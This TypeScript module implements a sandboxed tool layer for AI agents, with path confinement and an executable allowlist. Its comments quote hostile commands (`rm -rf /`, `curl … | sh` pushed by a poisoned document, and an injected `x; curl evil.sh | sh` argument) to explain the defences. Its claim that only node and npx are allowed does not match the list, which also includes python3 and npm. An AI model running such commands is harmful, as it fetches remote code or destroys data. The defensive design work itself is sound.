// The hands: the tool surface a model needs to do a stage's work.
//
// Claude Code brings its own — read, write, edit, glob, grep, bash, and a
// skill mechanism. A raw model API brings none of that: it can reason and it
// can emit a function call, and something on this side has to actually open
// the file. That something is this module, written once so every provider gets
// the same hands and the same behaviour, rather than once per vendor.
//
// Two rules govern everything here, and both are about a model driving a real
// machine:
//
//   CONFINEMENT   every path resolves inside the work root or the call is
//                 refused. Not "warned about" — refused, with the attempted
//                 path named. `..` and absolute paths and symlinks out are all
//                 the same class of mistake.
//
//   ALLOWLIST     `run_command` accepts a fixed set of executables. A model
//                 asking for `rm -rf /` is not a threat model worth arguing
//                 about; a model that has been talked into `curl … | sh` by a
//                 poisoned discovery document is. The list is what a stage
//                 genuinely needs and nothing else.

import { execFile as nodeExecFile } from "node:child_process";
import { mkdir, readdir, readFile, rm, stat, writeFile } from "node:fs/promises";
import { dirname, join, relative, resolve, sep } from "node:path";

export interface ToolContext {
  /** Every path is resolved against, and confined to, this directory. */
  workRoot: string;
  /** Where scripts/ and skills/ live. Reachable only through `run_command`. */
  installRoot: string;
  /** Hard ceiling on a single read, so one enormous file cannot fill the context. */
  maxReadBytes?: number;
  /** Wall-clock limit for one `run_command`. */
  commandTimeoutMs?: number;
}

export interface ToolCall { name: string; input: Record<string, unknown> }
export interface ToolOutcome { ok: boolean; content: string }

export const DEFAULT_MAX_READ_BYTES = 256_000;
export const DEFAULT_COMMAND_TIMEOUT_MS = 20 * 60_000;

/**
 * Executables a stage legitimately needs.
 *
 * `node` is here because every validator, renderer and publisher in this
 * repository is a node script and the workflows invoke them by name. `npx` is
 * here because the Mermaid renderer is fetched that way. Nothing else is, and
 * in particular no shell: a command is parsed and executed as argv, so
 * `a && b`, backticks, pipes and redirection are not available to be abused.
 */
export const ALLOWED_COMMANDS = new Set([
  "node", "npx", "npm", "python3", "git", "ls", "cat", "mkdir", "cp", "mv", "wc", "head", "tail",
]);

export class ToolError extends Error {}

/**
 * Resolve `p` inside the work root, or throw.
 *
 * `relative()` rather than `startsWith()`: a prefix test says
 * `/work-evil` is inside `/work`, which is exactly the kind of near-miss that
 * survives review. A path is inside only when the relative route to it neither
 * climbs out nor is itself absolute.
 */
export function confine(workRoot: string, p: string): string {
  const root = resolve(workRoot);
  const abs = resolve(root, p);
  const rel = relative(root, abs);
  if (rel === "") return abs;
  if (rel.startsWith("..") || rel.split(sep)[0] === ".." || resolve(rel) === rel) {
    throw new ToolError(
      `path '${p}' resolves outside the work root and was refused.\n` +
      `  Everything this run may touch is under ${root}.`);
  }
  return abs;
}

const rel = (root: string, abs: string): string => relative(root, abs).split(sep).join("/") || ".";

/**
 * The tool schema, in the shape both providers want. Gemini and the Azure
 * Responses API both take JSON Schema for parameters, so one definition
 * serves both and neither can drift from what `runTool` actually implements.
 */
export const TOOL_SCHEMAS = [
  {
    name: "read_file",
    description: "Read a UTF-8 text file. Paths are relative to the working directory.",
    parameters: {
      type: "object",
      properties: { path: { type: "string", description: "Relative path to the file." } },
      required: ["path"],
    },
  },
  {
    name: "write_file",
    description: "Create or overwrite a file, creating parent directories as needed.",
    parameters: {
      type: "object",
      properties: {
        path: { type: "string", description: "Relative path to write." },
        content: { type: "string", description: "Full file contents." },
      },
      required: ["path", "content"],
    },
  },
  {
    name: "edit_file",
    description: "Replace an exact string in a file. The string must appear exactly once.",
    parameters: {
      type: "object",
      properties: {
        path: { type: "string" },
        old_string: { type: "string", description: "Exact text to replace." },
        new_string: { type: "string", description: "Replacement text." },
      },
      required: ["path", "old_string", "new_string"],
    },
  },
  {
    name: "list_files",
    description: "List files under a directory, recursively.",
    parameters: {
      type: "object",
      properties: {
        path: { type: "string", description: "Relative directory. Defaults to the working directory." },
      },
      required: [],
    },
  },
  {
    name: "search_files",
    description: "Find files whose contents match a regular expression.",
    parameters: {
      type: "object",
      properties: {
        pattern: { type: "string", description: "JavaScript regular expression." },
        path: { type: "string", description: "Relative directory to search. Defaults to the working directory." },
      },
      required: ["pattern"],
    },
  },
  {
    name: "run_command",
    description:
      `Run one allowed executable with arguments. No shell: pipes, redirection and ` +
      `&& are not interpreted. Allowed: ${[...ALLOWED_COMMANDS].sort().join(", ")}.`,
    parameters: {
      type: "object",
      properties: {
        command: { type: "string", description: "Executable name, e.g. 'node'." },
        args: { type: "array", items: { type: "string" }, description: "Arguments." },
      },
      required: ["command"],
    },
  },
] as const;

/** Recursively collect files, skipping the noise no stage wants to see. */
const IGNORED_DIRS = new Set(["node_modules", ".git", ".orchestrator", "dist", "build"]);

async function walk(root: string, dir: string, out: string[] = [], budget = { n: 5000 }): Promise<string[]> {
  if (budget.n <= 0) return out;
  let entries;
  try { entries = await readdir(dir, { withFileTypes: true }); } catch { return out; }
  for (const e of entries) {
    if (budget.n <= 0) break;
    if (e.isDirectory() && IGNORED_DIRS.has(e.name)) continue;
    const abs = join(dir, e.name);
    // Symlinks are not followed: in a materialised tree they point at the
    // install, and walking them would return the whole codebase.
    if (e.isSymbolicLink()) continue;
    if (e.isDirectory()) await walk(root, abs, out, budget);
    else if (e.isFile()) { out.push(rel(root, abs)); budget.n--; }
  }
  return out;
}

function execFile(
  cmd: string, args: string[], cwd: string, timeoutMs: number, env: NodeJS.ProcessEnv,
): Promise<{ code: number; stdout: string; stderr: string }> {
  return new Promise((res) => {
    // execFile, NOT exec. `exec` runs its command through /bin/sh, which would
    // make the allowlist decorative: `node` with an argument of
    // `x; curl evil.sh | sh` would be two commands, only the first of which
    // was checked. execFile takes argv directly and spawns no shell, so an
    // argument is only ever an argument.
    const child = nodeExecFile(
      cmd, args,
      { cwd, timeout: timeoutMs, maxBuffer: 16 * 1024 * 1024, env, shell: false },
      (err, stdout, stderr) => res({ code: err ? ((err as { code?: number }).code ?? 1) : 0, stdout, stderr }));
    child.on("error", () => { /* surfaced through the callback above */ });
  });
}

export async function runTool(call: ToolCall, ctx: ToolContext): Promise<ToolOutcome> {
  const maxRead = ctx.maxReadBytes ?? DEFAULT_MAX_READ_BYTES;
  const fail = (message: string): ToolOutcome => ({ ok: false, content: message });

  try {
    switch (call.name) {
      case "read_file": {
        const abs = confine(ctx.workRoot, String(call.input.path ?? ""));
        const s = await stat(abs).catch(() => null);
        if (!s) return fail(`no such file: ${call.input.path}`);
        if (s.isDirectory()) return fail(`${call.input.path} is a directory — use list_files`);
        const body = await readFile(abs, "utf8");
        return {
          ok: true,
          content: body.length > maxRead
            ? `${body.slice(0, maxRead)}\n\n[…truncated at ${maxRead} characters]`
            : body,
        };
      }

      case "write_file": {
        const abs = confine(ctx.workRoot, String(call.input.path ?? ""));
        const content = String(call.input.content ?? "");
        await mkdir(dirname(abs), { recursive: true });
        await writeFile(abs, content, "utf8");
        return { ok: true, content: `wrote ${content.length} characters to ${call.input.path}` };
      }

      case "edit_file": {
        const abs = confine(ctx.workRoot, String(call.input.path ?? ""));
        const oldStr = String(call.input.old_string ?? "");
        const newStr = String(call.input.new_string ?? "");
        if (!oldStr) return fail(`old_string must not be empty — use write_file to create a file`);
        const body = await readFile(abs, "utf8").catch(() => null);
        if (body === null) return fail(`no such file: ${call.input.path}`);

        const count = body.split(oldStr).length - 1;
        // Ambiguity is refused rather than resolved. Replacing "the first
        // one" when a model meant another is a silent wrong edit, and silent
        // wrong edits are the failure mode this whole loop must not have.
        if (count === 0) return fail(`old_string not found in ${call.input.path}`);
        if (count > 1) return fail(`old_string appears ${count} times in ${call.input.path} — make it unique`);

        await writeFile(abs, body.replace(oldStr, newStr), "utf8");
        return { ok: true, content: `edited ${call.input.path}` };
      }

      case "list_files": {
        const abs = confine(ctx.workRoot, String(call.input.path ?? "."));
        const files = await walk(ctx.workRoot, abs);
        return files.length
          ? { ok: true, content: files.sort().join("\n") }
          : { ok: true, content: `(no files under ${call.input.path ?? "."})` };
      }

      case "search_files": {
        const abs = confine(ctx.workRoot, String(call.input.path ?? "."));
        let re: RegExp;
        try { re = new RegExp(String(call.input.pattern ?? ""), "m"); }
        catch (e) { return fail(`invalid pattern: ${e instanceof Error ? e.message : String(e)}`); }

        const hits: string[] = [];
        for (const f of await walk(ctx.workRoot, abs)) {
          const body = await readFile(join(ctx.workRoot, f), "utf8").catch(() => null);
          if (body === null) continue;
          const line = body.split("\n").find(l => re.test(l));
          if (line !== undefined) hits.push(`${f}: ${line.trim().slice(0, 200)}`);
          if (hits.length >= 200) break;
        }
        return { ok: true, content: hits.length ? hits.join("\n") : "(no matches)" };
      }

      case "run_command": {
        const cmd = String(call.input.command ?? "");
        const args = Array.isArray(call.input.args) ? call.input.args.map(String) : [];
        if (!ALLOWED_COMMANDS.has(cmd)) {
          return fail(
            `'${cmd}' is not an allowed command.\n` +
            `  Allowed: ${[...ALLOWED_COMMANDS].sort().join(", ")}`);
        }
        const r = await execFile(cmd, args, ctx.workRoot, ctx.commandTimeoutMs ?? DEFAULT_COMMAND_TIMEOUT_MS, {
          ...process.env,
          // The same contract exec steps get: scripts find themselves through
          // the install root and act on the project through WORKSPACE_PATH.
          WORKSPACE_PATH: ctx.workRoot,
          SCYNE_WORK_ROOT: ctx.workRoot,
          SCYNE_INSTALL_ROOT: ctx.installRoot,
        });
        const out = [r.stdout, r.stderr].filter(Boolean).join("\n").slice(0, maxRead);
        return { ok: r.code === 0, content: `exit ${r.code}\n${out}` };
      }

      default:
        return fail(`unknown tool '${call.name}'`);
    }
  } catch (err) {
    // A refused path or a failed read is a RESULT, not an exception: the model
    // must see it and correct course, exactly as it would with any other tool
    // output. Throwing here would abort a run over a recoverable mistake.
    return fail(err instanceof Error ? err.message : String(err));
  }
}
